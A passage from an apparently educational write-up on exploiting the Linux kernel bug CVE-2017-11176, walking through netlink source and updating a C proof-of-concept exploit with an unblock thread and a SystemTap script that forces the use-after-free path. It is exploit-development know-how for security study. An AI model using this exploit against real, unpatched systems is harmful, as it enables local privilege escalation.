<span class="w">            </span><span class="o">!</span><span class="n">sock_flag</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DEAD</span><span class="p">))</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">       </span><span class="o">*</span><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">schedule_timeout</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">     </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_RUNNING</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w">     </span><span class="n">remove_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="n">sock_intr_errno</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">skb_set_owner_r</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The code should now sound familiar. The combination of <strong>__set_current_state(TASK_INTERRUPTIBLE)</strong> [1] and <strong>schedule_timeout()</strong> [4] is what makes the thread blocking. The condition [3] is true because:</p><ul><li>We forced it with System Tap: <em>nlk-&gt;state |= 1</em></li><li>The sock is not DEAD anymore, we removed this line: <em>sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD)</em></li></ul><p><strong>NOTE</strong>: The call schedule_timeout(MAX_SCHEDULE_TIMEOUT) is really equivalent to calling schedule().</p><p>As we know, a blocked thread can be woken up if it has registered to a <strong>wake queue</strong>. This registration is made with [0] and [2], whilst the unregistration is done in [6]. The wait queue itself is <strong>nlk-&gt;wait</strong>. That is, it belongs to the netlink_sock object:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="cm">/* struct sock has to be the first member of netlink_sock */</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w">     </span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="n">wait_queue_head_t</span><span class="w">   </span><span class="n">wait</span><span class="p">;</span><span class="w">           </span><span class="c1">// &lt;----- the wait queue</span>
<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This means, <strong>it is the netlink_sock object responsibility to wake up the blocked thread(s)</strong>.</p><p>The <em>nlk-&gt;wait</em> wait queue is actually used in four places:</p><ol><li>__netlink_create()</li><li>netlink_release()</li><li>netlink_rcv_wake()</li><li>netlink_setsockopt()</li></ol><p>Function __netlink_create() is called during netlink socket creation. It initializes an empty wait queue with <strong>init_waitqueue_head()</strong>.</p><p>Function <em>netlink_rcv_wake()</em> is invoked by <strong>netlink_recvmsg()</strong> and calls <strong>wake_up_interruptible()</strong>. It actually makes sense since the first reason to <em>block</em> was because the receive buffer is full. If <em>netlink_recvmsg()</em> is invoked, then there are chances that there is now more room in the receive buffer.</p><p>Function <em>netlink_release()</em> is invoked when the associated struct file is about to be freed (refcounter drops down to zero). It invokes <strong>wake_up_interruptible_all()</strong>.</p><p>Finally, <em>netlink_setsockopt()</em> is invoked through syscall <em>setsockopt()</em>. If the "optname" is <strong>NETLINK_NO_ENOBUFS</strong>, then <strong>wake_up_interruptible()</strong> is called.</p><p>So, we have three candidates to wake up our thread (__netlink_create() excluded as it does not wake up anything). When facing such a choice, you want a path that:</p><ul><li>Quickly reaches the desired target (wake_up_interruptible() in our case). That is, a small call trace, a few "conditions" to pass...</li><li>Has little impacts/side-effects on the kernel (no memory allocation, don't touch other data structures...)</li></ul><p>The netlink_release() path is excluded for exploitation reasons. As you will see in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>, we do not want to free the struct file associated to the sock because it is our mean to trigger the use-after-free in a controlled manner.</p><p>The netlink_rcv_wake() path is the most "complex" one. Before reaching it from a "recvmsg()" syscall, we need to pass several checks in the <em>generic</em> socket API. It also allocates various things, etc. The call trace is:</p><div class="highlight"><pre><span></span><code>- SYSCALL_DEFINE3(recvmsg)
- __sys_recvmsg
- sock_recvmsg
- __sock_recvmsg
- __sock_recvmsg_nosec  // calls sock-&gt;ops-&gt;recvmsg()
- netlink_recvmsg
- netlink_rcv_wake
- wake_up_interruptible
</code></pre></div><p>In comparison, the call trace for "setsockopt()" is:</p><div class="highlight"><pre><span></span><code>- SYSCALL_DEFINE5(setsockopt) // calls sock-&gt;ops-&gt;setsockopt()
- netlink_setsockopt()
- wake_up_interruptible
</code></pre></div><p>Much simpler, isn't it?</p><h2 id="reaching-wake_up_interruptible-from-setsockopt-syscall">Reaching wake_up_interruptible() from setsockopt syscall</h2><p>In the previous section, we saw that reaching wake_up_interruptible() from setsockopt syscall was the simplest way. Let's analyze the checks that need to be passed:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [net/socket.c]</span>

<span class="w">    </span><span class="n">SYSCALL_DEFINE5</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">,</span><span class="w"> </span><span class="n">fput_needed</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">optlen</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sockfd_lookup_light</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">err</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">fput_needed</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">security_socket_setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="n">optname</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out_put</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">level</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
<span class="w">              </span><span class="n">sock_setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"> </span><span class="n">optval</span><span class="p">,</span><span class="w"></span>
<span class="w">                  </span><span class="n">optlen</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">else</span><span class="w"></span>
<span class="w">          </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">           </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">ops</span><span class="o">-&gt;</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"> </span><span class="n">optval</span><span class="p">,</span><span class="w"></span>
<span class="w">                  </span><span class="n">optlen</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="nl">out_put</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="n">fput_light</span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">fput_needed</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>From the syscall itself, we need:</p><ul><li>[0] - <strong>optlen</strong> is not negative</li><li>[1] - the <strong>fd</strong> should be a valid socket</li><li>[2] - LSM <strong>must</strong> allow us to call setsockopt() for a socket</li><li>[3] - <strong>level</strong> is different from SOL_SOCKET</li></ul><p>If we pass all those checks, it will call netlink_setsockopt() [4]:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_setsockopt</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"></span>
<span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">level</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOPROTOOPT</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">optlen</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">get_user</span><span class="p">(</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">optval</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">optname</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">// ... cut (other options) ...</span>

<span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="w">   </span><span class="k">case</span><span class="w"> </span><span class="nl">NETLINK_NO_ENOBUFS</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">NETLINK_RECV_NO_ENOBUFS</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">clear_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w">       </span><span class="n">wake_up_interruptible</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"></span>
<span class="w">          </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">NETLINK_RECV_NO_ENOBUFS</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">default</span><span class="o">:</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">ENOPROTOOPT</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The additional checks are:</p><ul><li>[5] - <strong>level</strong> must be SOL_NETLINK</li><li>[6] - <strong>optlen</strong> must be greater or equal <em>sizeof(int)</em> and <strong>optval</strong> should be a readable memory location</li><li>[7] - <strong>optname</strong> must be NETLINK_NO_ENOBUFS</li><li>[8] - <strong>val</strong> must be different from zero</li></ul><p>If we pass all checks, wake_up_interruptible() will be invoked which will wake up the blocked thread. In the end, the following snippet does the job of invoking it:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_GENERIC</span><span class="p">);</span><span class="w"> </span><span class="c1">// same socket used by blocking thread</span>
<span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3535</span><span class="p">;</span><span class="w"> </span><span class="c1">// different than zero</span>
<span class="n">_setsockopt</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">));</span><span class="w"></span>
</code></pre></div><p>Let's integrate this in our exploit.</p><h2 id="updating-the-exploit">Updating The Exploit</h2><p>In the previous section, we saw how to invoke wake_up_interruptible() from userland with the help of the setsockopt() syscall. There is one problem however: how to call anything if we are blocking? <strong>Answer: use multiple threads</strong>!</p><p>So, let's create another thread (called <strong>unblock_thread</strong> in the exploit), and update the exploit (compile with "-pthread"):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">bool</span><span class="w"> </span><span class="n">is_ready</span><span class="p">;</span><span class="w">  </span><span class="c1">// we could use pthread's barrier here instead</span>
<span class="w">    </span><span class="p">};</span><span class="w"></span>

<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">unblock_thread</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"> </span><span class="o">*</span><span class="n">uta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">arg</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3535</span><span class="p">;</span><span class="w"> </span><span class="c1">// need to be different than zero</span>

<span class="w">      </span><span class="c1">// notify the main thread that the unblock thread has been created</span>
<span class="w">      </span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">is_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"> </span>
<span class="w">      </span><span class="c1">// WARNING: the main thread *must* directly call mq_notify() once notified!</span>
<span class="w">      </span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="w"> </span><span class="c1">// gives some time for the main thread to block</span>

<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"[unblock] unblocking now</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">sigev</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">char</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">[</span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">];</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">pthread_t</span><span class="w"> </span><span class="n">tid</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"> </span><span class="n">uta</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="c1">// ... cut ...</span>

<span class="w">      </span><span class="c1">// initialize the unblock thread arguments, and launch it</span>
<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uta</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">uta</span><span class="p">));</span><span class="w"></span>
<span class="w">      </span><span class="n">uta</span><span class="p">.</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">uta</span><span class="p">.</span><span class="n">is_ready</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"creating unblock thread...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">unblock_thread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">uta</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"pthread_create"</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">uta</span><span class="p">.</span><span class="n">is_ready</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="p">)</span><span class="w"> </span><span class="c1">// spinlock until thread is created</span>
<span class="w">        </span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"unblocking thread has been created!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"get ready to block</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">))</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"mq_notify"</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"mq_notify succeed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="c1">// ... cut ...</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>One might notice that we called "sleep(5)" and did something with the "uta-&gt;is_ready". Let's explain them.</p><p>Calling <strong>pthread_create()</strong> is a request to create a thread (i.e. a new task_struct) and launch it. Creating the task does not mean that the task will run right now. In order to be sure that the thread has started to run we use a <strong>spinlock</strong>: uta-&gt;is_ready.</p><p><strong>NOTE</strong>: Spinlocks are the simplest form of (active) locking. It basically loops until a variable state changes. This is "active" because the CPU is used at 99% during this time. One might want to use atomic-like variable, this is not required here as there are only one writer and one reader.</p><p><strong>WARNING</strong>: Be careful with "unlock" (spinlock) and "unblock" (wake up) in the next sections!</p><p>The main thread is stuck in a loop until the unblock_thread unlocks it (set 'is_ready' to true). The same thing could be achieved with pthread's barrier (it is not always available). Note that spinlocking here is optional, it just gives "more control" over thread creation. Another reason is that task creation might imply a lot of memory allocations that disturb exploits in general. Finally, the very same technique will be required in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>, so why not introducing it here.</p><p>On the other hand, let's assume that after pthread_create() our main thread becomes preempted for a "long" period of time (i.e. not executed). We might have the following sequence:</p><div class="highlight"><pre><span></span><code>Thread-1          | Thread-2
------------------+---------------------------
                  |
pthread_create()  |
                  | &lt;&lt;&lt; new task created &gt;&gt;&gt;
&lt;&lt;&lt; preempted &gt;&gt;&gt; |
                  | &lt;&lt;&lt; thread starts &gt;&gt;&gt;
&lt;&lt;&lt; still...      |
 ...preempted &gt;&gt;&gt; | setsockopt() -&gt; succeed
                  |
mq_notify()       |
=&gt; start BLOCKING |
</code></pre></div><p>In this scenario, the call to "setsockopt()" is made before mq_notify is blocking. That is, it <strong>won't</strong> unblock the main thread. This is the reason of <strong>sleep(5)</strong> after unlocking the main thread ('is_ready' is true). In other words, it gives at least 5 seconds to "just" call mq_notify(). You can safely assume that "5 seconds" is enough because:</p><ul><li>If the main thread is still preempted after 5 seconds, the targeted system is under heavy loads, you shouldn't run the exploit anyway.</li><li>If the unblock_thread "race" the main thread (setsockopt() before mq_notify()) then we can always send a CTRL+C command. Doing so makes netlink_attachskb() return "-ERESTARTSYS". The bug is not triggered in that path. We can retry the exploit.</li></ul><p>In other words, the "controlled windows" duration is now 5 seconds. One might think, this is a bit ugly, the problem is: the main thread has no way to notify the other to wake it up because it is not running (cf. core concept #2). Maybe the unblock_thread might poll some information in some way? Well... the sleep(5) trick is enough here :-).</p><h2 id="updating-the-stap-script">Updating the STAP Script</h2><p>Alright, before running the new exploit, we need to edit our stap scripts. Right now, we remove the netlink socket (fd=3) <strong>before</strong> calling netlink_attachskb(). It means that if we call setsockopt() after entering netlink_attachskb(), the file descriptor <em>sock_fd</em> will be invalid (it points to NULL in the FDT). That is, setsockopt() will simply fail with a "Bad File Descriptor" error (i.e. we won't even reach <em>netlink_setsockopt()</em>).</p><p>So, let's remove the fd "3" in the FDT while returning from netlink_attachskb(), not before:</p><div class="highlight"><pre><span></span><code><span class="c1"># mq_notify_force_crash.stp</span>
<span class="c1">#</span>
<span class="c1"># Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)</span>

%<span class="o">{</span>
<span class="c1">#include &lt;net/sock.h&gt;</span>
<span class="c1">#include &lt;net/netlink_sock.h&gt;</span>
<span class="c1">#include &lt;linux/fdtable.h&gt;</span>
%<span class="o">}</span>

<span class="k">function</span> force_trigger_before:long <span class="o">(</span>arg_sock:long<span class="o">)</span>
%<span class="o">{</span>
  struct sock *sk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> STAP_ARG_arg_sock<span class="p">;</span>
